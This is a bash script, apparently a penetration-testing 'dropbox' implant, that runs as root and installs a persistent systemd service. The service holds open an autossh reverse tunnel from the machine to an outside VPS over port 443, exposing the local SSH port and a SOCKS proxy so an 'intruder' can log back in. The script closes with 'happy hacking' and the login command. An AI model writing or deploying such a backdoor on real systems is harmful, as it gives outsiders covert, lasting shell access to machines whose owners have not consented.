#!/bin/bash

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This script must be run as root user"
    exit 1
fi
# VPS Information
remote_user="vpsuser" # User VPS
remote_host="vpsserver.li" # Host VPS
remote_ssh_port=443 # VPS Port

# SSH Information
intruder_ssh_port=$(grep -E "^Port" /etc/ssh/sshd_config | cut -d " " -f2) # Intruder Port

DIRNAME="arsenal"
WORKDIR="$HOME/$DIRNAME"
echo "" > /etc/systemd/system/autossh-tunnel.service
cat <<EOT >> /etc/systemd/system/autossh-tunnel.service
[Unit]
Description=AutoSSH tunnel
After=network.target

[Service]
Environment="AUTOSSH_GATETIME=0"
ExecStart=/usr/bin/autossh -M 0 -vvv -g -N -T -o 'ServerAliveInterval 10' -o 'ExitOnForwardFailure yes' -R 2222:localhost:$intruder_ssh_port $remote_user@$remote_host -p$remote_ssh_port -CD9999

[Install]
WantedBy=multi-user.target
EOT

echo "[+] Service created: autossh-tunnel"
echo "[!] FIRST LOGIN REQUIRED TO ACCEPT FINGERPRINT, ACCEPT AND EXIT (CTRL+C)"
/usr/bin/autossh -M 0 -g -N -T -o 'ServerAliveInterval 10' -o 'ExitOnForwardFailure yes' -R 2222:localhost:$intruder_ssh_port $remote_user@$remote_host -p$remote_ssh_port -CD9999
echo -e "\n"
echo ssh restart
systemctl daemon-reload
systemctl enable autossh-tunnel
systemctl restart ssh
echo "[+] happy hacking"
echo -e "\n"
echo "ssh root@localhost -p2222"
echo -e "\n"
